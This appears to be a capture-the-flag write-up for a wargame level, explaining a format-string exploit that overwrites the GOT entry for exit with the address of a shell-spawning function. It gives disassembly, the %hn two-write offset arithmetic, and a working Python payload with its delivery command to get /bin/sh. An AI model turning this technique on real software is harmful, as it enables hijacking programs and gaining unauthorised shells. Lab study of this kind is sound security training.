# Way to level6

## Core
FSB again, but there is **no cmp** and the shell-spawning `o()` is **never called** → not a
branch to pass but a **GOT overwrite** to hijack control flow. After printf, `n` calls
`exit@plt` → overwrite `GOT[exit]` with `o()`'s address so that `exit` jumps into `o()`,
which runs `system("/bin/sh")`.

## Decisive disass (full: `disas n`, `disas o`, `disas exit`)
```
n:
<+35>: call fgets@plt
<+49>: call printf@plt        ; FSB (inside n, close like level3)
<+61>: call exit@plt          ; <- overwrite this GOT (no cmp)
exit@plt:
<+0>:  jmp  *0x8049838        ; GOT[exit] = 0x8049838
```

## Exploit
- offset 4 (derivation): in `AAAA` + `%x`*4, `41414141` is the 4th → printf is inside `n`,
  so same as level3.
- Value/address: `GOT[exit] = 0x8049838` (source: `exit@plt+0 jmp *0x8049838`), target
  `o() = 0x080484a4` (source: `info functions`/`disas o`+0).
- 2-byte split (why two addresses): writing `0x080484a4` in one shot needs ~134M printed
  chars → impractical. Split into 2-byte halves written with `%hn` → two writes → two
  destination addresses (8B). The `+2` is that 2-byte step.
  - high half `0x0804` = 2052 → `0x8049838+2 = 0x804983a`
  - low half  `0x84a4` = 33956 → `0x8049838`
- char count (cumulative, only increases → **smaller value first**); the two addresses
  already print 8B, so the baseline is 8.
  - `%2044x%4$hn`: 8 + 2044 = **2052** → `0x804983a` (slot 4). (2052−8=2044)
  - `%31904x%5$hn`: 2052 + 31904 = **33956** → `0x8049838` (slot 5). (33956−2052=31904)
- Delivery: `o()` runs `/bin/sh` (interactive) → cat - trick (same as level1).
```bash
python -c 'print "\x3a\x98\x04\x08\x38\x98\x04\x08%2044x%4$hn%31904x%5$hn"' > /tmp/exp
cat /tmp/exp - | ./level5
```

## Diff from previous
level3/4: one write to a global to pass a `cmp` branch → 1 address.
level5: no cmp + a never-called `o()` → **GOT overwrite** to hijack flow. The value is large,
so **2-byte split + `%hn`** → 2 addresses. The shell is `/bin/sh`, so the cat - trick returns
(level4 ran cat directly).

